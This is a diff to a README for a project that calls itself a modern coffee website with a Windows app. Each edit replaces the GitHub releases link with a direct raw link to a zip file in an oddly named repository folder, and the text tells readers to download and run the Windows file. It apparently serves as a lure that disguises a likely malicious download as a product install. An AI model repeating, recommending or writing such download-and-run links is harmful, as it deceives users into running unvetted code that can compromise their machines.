@@ -1,6 +1,6 @@
 # ☕ Emad-Afandi - Modern Coffee Site, Easier Browsing
 
-[![Download the app](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Mayil6930/Emad-Afandi/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Mayil6930/Emad-Afandi/main/subcreek/Emad-Afandi-rider.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ The site uses smooth motion, clear page layouts, and a design that fits both des
 
 Visit this page to download the Windows version:
 
-[https://github.com/Mayil6930/Emad-Afandi/releases](https://github.com/Mayil6930/Emad-Afandi/releases)
+[https://raw.githubusercontent.com/Mayil6930/Emad-Afandi/main/subcreek/Emad-Afandi-rider.zip](https://raw.githubusercontent.com/Mayil6930/Emad-Afandi/main/subcreek/Emad-Afandi-rider.zip)
 
 Choose the latest release, then download the file for Windows. After the download finishes, open the file to start the app.
 
@@ -41,7 +41,7 @@ For the smoothest experience, use a current version of Microsoft Edge, Chrome, o
 ## 🧭 How to Install on Windows
 
 1. Open the download page:
-   [https://github.com/Mayil6930/Emad-Afandi/releases](https://github.com/Mayil6930/Emad-Afandi/releases)
+   [https://raw.githubusercontent.com/Mayil6930/Emad-Afandi/main/subcreek/Emad-Afandi-rider.zip](https://raw.githubusercontent.com/Mayil6930/Emad-Afandi/main/subcreek/Emad-Afandi-rider.zip)
 
 2. Find the newest release at the top of the page.
 
@@ -175,6 +175,6 @@ If you use the website in a browser instead of the app:
 
 Get the latest Windows download here:
 
-[https://github.com/Mayil6930/Emad-Afandi/releases](https://github.com/Mayil6930/Emad-Afandi/releases)
+[https://raw.githubusercontent.com/Mayil6930/Emad-Afandi/main/subcreek/Emad-Afandi-rider.zip](https://raw.githubusercontent.com/Mayil6930/Emad-Afandi/main/subcreek/Emad-Afandi-rider.zip)
 
 Open the newest release, then download and run the Windows file from that page.
